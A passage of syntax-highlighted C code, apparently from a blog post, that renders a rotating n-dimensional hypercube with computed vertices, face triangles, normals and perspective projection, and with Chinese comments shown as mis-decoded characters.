class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="comment">/*  é¢æ•°å…¬å¼è§£é‡Š</span></span><br><span class="line"><span class="comment">        æ¯ä¸ª n ç»´æ­£æ–¹ä½“ä¸­çš„æ¯ä¸ª m ç»´è¾¹ç•Œéƒ½ä¼šè¢« n-m ä¸ª m+1 ç»´è¾¹ç•Œå…±ç”¨ã€‚æ¯”å¦‚æ­£å…­é¢ä½“ä¸­ï¼Œæ¯æ¡æ£±è¢«ä¸¤ä¸ªé¢å…±ç”¨ï¼Œè€Œæ¯ä¸ªé¡¶ç‚¹è¢«ä¸‰æ¡æ£±å…±ç”¨ã€‚</span></span><br><span class="line"><span class="comment">        è¿™æ ·ç®—æ¥ï¼Œå¯¹äºä»»æ„ä¸€ä¸ª n ç»´çš„æ­£æ–¹ä½“ï¼Œè®¡ç®—å…¶ä¸é‡å¤çš„äºŒç»´æ­£æ–¹å½¢è¡¨é¢çš„æ•°é‡åº”è¯¥ä¸ºï¼š</span></span><br><span class="line"><span class="comment">          6x8x10x...x(2n)/(2*3*...*(n-2))</span></span><br><span class="line"><span class="comment">        =(2^(n-2))*(n!)/2/(n-2)!</span></span><br><span class="line"><span class="comment">        =(2^(n-3))*n*(n-1)*/</span></span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;<span class="comment">//é¡¶ç‚¹ä¸ªæ•°*ç»´æ•°</span></span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];<span class="comment">//ç›¸é‚»é¡¶ç‚¹é›†ï¼Œå¦‚ï¼šä¸‰ç»´ä¸­0å·é¡¶ç‚¹ä¸1ï¼Œ3ï¼Œ7ç›¸é‚»ï¼Œåˆ™å‰dimensionä¸ªå…ƒç´ ä¸º1ï¼Œ3ï¼Œ7 | åŒç†ï¼Œæ³•å‘é‡å¯¹åº”ä¸‰è§’å½¢é¢çš„ä¸‰ä¸ªvexçš„index</span></span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];<span class="comment">//å½“å‰é¡¶ç‚¹åæ ‡ | åŸå§‹é¡¶ç‚¹åæ ‡ | æŠ•å½±åé¡¶ç‚¹åæ ‡ | ä¸´æ—¶</span></span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];<span class="comment">//æ³•å‘é‡ç»“æœé›†</span></span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));<span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;<span class="comment">//è¿™ä¸ªç®—æ³•éœ€è¦æœ‰å‰è½¦ä¹‹é‰´</span></span><br><span class="line">    <span class="comment">/*å¾—åˆ°é¡¶ç‚¹åæ ‡</span></span><br><span class="line"><span class="comment">    ç”¨ä¸Šä¸€å‘é‡ä¸€ä¸ªå…ƒç´ å˜å·ï¼Œä½¿å…¶ä¸ä¹‹å‰ä»»ä¸€å‘é‡éƒ½ä¸åŒï¼Œè¯¥å‘é‡å³è¦æ‰¾çš„ä¸‹ä¸€ä¸ªé¡¶ç‚¹</span></span><br><span class="line"><span class="comment">    å‘é‡ä¸åŒ = å…ƒç´ è‡³å°‘æœ‰ä¸€ä¸ªä¸ç›¸åŒ*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;<span class="comment">//éå†å°è¯•æ”¹å˜vexIndex-1å‘é‡çš„æ¯ä¸€å•ä¸ªå…ƒç´ æ­£è´Ÿå·ï¼Œæ‰§è¡Œæ¡ä»¶ï¼šdä¸ºå‡</span></span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;<span class="comment">//éå†æ¯ä¸ªå‘é‡ï¼Œæ‰§è¡Œæ¡ä»¶ï¼šdä¸ºçœŸï¼Œæ¯æ¬¡åˆå§‹åŒ–dä¸ºå‡</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)<span class="comment">//éå†æ¯”è¾ƒvexIndex-1å‘é‡ä¸ä¹‹å‰å‘é‡çš„å…ƒç´ </span></span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°vex</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vex[i*dimension+j]&gt;=0)printf(&quot; %.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;%.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;Vex Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">/*å¾—åˆ°ç›¸é‚»é¡¶ç‚¹ï¼Œç›¸é‚»é¡¶ç‚¹åœ¨vexä¸­çš„indexå­˜å‚¨åˆ°vexLinkä¸­</span></span><br><span class="line"><span class="comment">    å…ˆåœ¨vexLinkä¸­å·²ç»å»ºç«‹linkçš„éƒ¨åˆ†æ‰¾æœ‰æ²¡æœ‰ä¹‹å‰linkåˆ°è¿‡å½“å‰æ­£åœ¨å»ºç«‹linkçš„ç‚¹ï¼Œæœ‰åˆ™ç›´æ¥åŠ å…¥å½“å‰çš„link</span></span><br><span class="line"><span class="comment">    linkIndexï¼šè¿™æ˜¯ç¬¬å‡ ä¸ªå·²ç»å»ºç«‹linkçš„ç‚¹</span></span><br><span class="line"><span class="comment">    åœ¨linkæ•°é‡è¾¾åˆ°dimensionä¹‹å‰ï¼Œç”¨å½“å‰å‘é‡ä¸ä¹‹å‰çš„å‘é‡ä½œæ¯”è¾ƒï¼Œå¦‚æœ_åª_æ›´_æ”¹_ä¸€_ä¸ª_ç¬¦_å·_å°±å¯ä»¥åŒ¹é…ï¼Œåˆ™åŠ å…¥linkï¼Œç›´åˆ°å½“å‰å‘é‡çš„linkæ»¡dimensionä¸ª*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;<span class="comment">//vexIndexï¼šå½“å‰æ­£åœ¨å»ºç«‹linkçš„ç‚¹ | nï¼šå·²ç»å»ºç«‹åˆ°ç¬¬å‡ ä¸ªlinkäº†</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;<span class="comment">//éå†å½“å‰å‘é‡ä¹‹åçš„æ¯ä¸ªå‘é‡ || differenceï¼šå­˜åœ¨ä¸ä¸€æ ·çš„å…ƒç´ çš„æ•°é‡</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)<span class="comment">//éå†è¢«æ¯”è¾ƒå‘é‡ä¸­çš„æ¯ä¸ªå…ƒç´ </span></span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°vexLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vexLink[i*dimension+j]&gt;=10)printf(&quot;%d, &quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot; %d ,&quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;vexLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">//å¾—åˆ°é¢å¯¹åº”çš„ä¸‰ä¸ªç‚¹</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)<span class="comment">//cur n è¡¨ç¤ºæŒ‡å‘ç¬¬å‡ ä¸ªé¡¶ç‚¹ï¼ŒnormalIndexè¡¨è¿™æ˜¯å·²ç»æ‰¾åˆ°çš„ç¬¬å‡ ä¸ªä¸‰è§’å½¢</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;<span class="comment">//pDiag(Plane Diagonal)è¡¨æ˜¯å¦ä¸ºå¹³é¢å¯¹è§’ç‚¹ï¼Œå³cur1é€šè¿‡Linkç´¢å¼•ï¼Œåœ¨ç¬¬äºŒæ¬¡å¯ä»¥ç´¢å¼•åˆ°cur2</span></span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)<span class="comment">//ç¬¬ä¸€æ¬¡ç´¢å¼•çš„åç§»</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)<span class="comment">//ç¬¬äºŒæ¬¡ç´¢å¼•çš„åç§»</span></span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)<span class="comment">//iæŒ‡å‘normalLinkä¸­çš„å‘é‡</span></span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])<span class="comment">//cur1ä¸ç¬¬iä¸ªnormalLinkä¸­å­˜åœ¨å…ƒç´ é‡åˆï¼Ÿ</span></span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))<span class="comment">//cur2ä¸ç¬¬iä¸ªnormalLinkä¸­å­˜åœ¨å…ƒç´ é‡åˆï¼Ÿ</span></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;<span class="comment">//public[j]ä¸ç¬¬iä¸ªnormalLinkä¸­å­˜åœ¨å…ƒç´ é‡åˆï¼Ÿ</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°normalLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;2*face;i++)&#123;</span></span><br><span class="line"><span class="comment">        //if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        //else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;3;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(normalLink[i*3+j]&gt;=10) printf(&quot;%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;0%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;normalLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="comment">//=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;<span class="comment">//å¤§å¾ªç¯</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);</span><br><span class="line">            &#125;<span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));<span class="comment">//è¿˜åŸvexåˆ°åˆå§‹çŠ¶æ€ï¼Œå¦åˆ™å¸¦è§’åŠ é€Ÿåº¦</span></span><br><span class="line">        <span class="comment">//è®¡ç®—å‘é‡ä¸æ—‹è½¬çŸ©é˜µç›¸ä¹˜ï¼Œ0å¤ªå¤šï¼Œæ²¡å¿…è¦æçœŸæ­£çš„çŸ©é˜µä¹˜æ³•</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;<span class="comment">//é™å®šæ—‹è½¬æ¬¡æ•°ï¼›rotateAroundæ¯è¡Œ2ä¸ªå…ƒç´ ï¼Œjçš„ä½œç”¨æ˜¯é€‰å–ä»–ä»¬</span></span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)<span class="comment">//éå†æ‰€æœ‰çš„è½´</span></span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])<span class="comment">//å½“å‰è½´æ˜¯è¢«æ—‹è½¬è½´æ—¶ï¼Œç»“æœç¬¦åˆæ—‹è½¬çŸ©é˜µè®¡ç®—ç»“æœ</span></span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//æ‘„åƒæœºæ—‹è½¬</span></span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ä»¥é€è§†æŠ•å½±é™ç»´</span></span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];<span class="comment">//å¤‡ä»½xï¼Œyè½´ç”¨äºè®¡ç®—å¹³é¢æ–¹ç¨‹</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;<span class="comment">//d+1 = å½“å‰ç»´æ•°</span></span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;<span class="comment">//è¶è¿˜åœ¨ä¸‰ç»´çš„æ—¶å€™å…ˆæŠŠæ³•å‘é‡ç®—äº†ï¼Œä¸ç„¶åå…‰çš„é¢å°±ä¹Ÿé€è§†äº†</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;<span class="comment">//ä»¥å…¨å±€è´¨å¿ƒè®¡ç®—ï¼Œä½¿æ³•å‘é‡å‘å¤–</span></span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)<span class="comment">//vexIndexï¼šç¬¬å‡ ä¸ªå‘é‡ï¼Œaxisï¼šè¯¥å‘é‡çš„ç¬¬å‡ ä¸ªå…ƒç´ </span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);</span><br><span class="line">            <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°vexProjected</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;vexNum/dimension&amp;&amp;d&gt;2;i++)&#123;</span></span><br><span class="line"><span class="comment">                if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">                else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">                for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">                    if(vexProjected[i*dimension+j]&gt;=0)printf(&quot; %.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                    else printf(&quot;%.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">                printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            if(d&gt;2) printf(&quot;VexPorjected Above , dimension = %d\n&quot;,d);</span></span><br><span class="line"><span class="comment">            //*/</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è¾“å‡ºåˆ°out_f[]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//å½“å‰ä¸‰è§’å½¢è´¨å¿ƒ</span></span><br><span class="line">                    <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                        tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                        y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                        tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                        z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                        xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                        yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    tCenter[<span class="number">0</span>]/=<span class="number">3</span>;</span><br><span class="line">                    tCenter[<span class="number">1</span>]/=<span 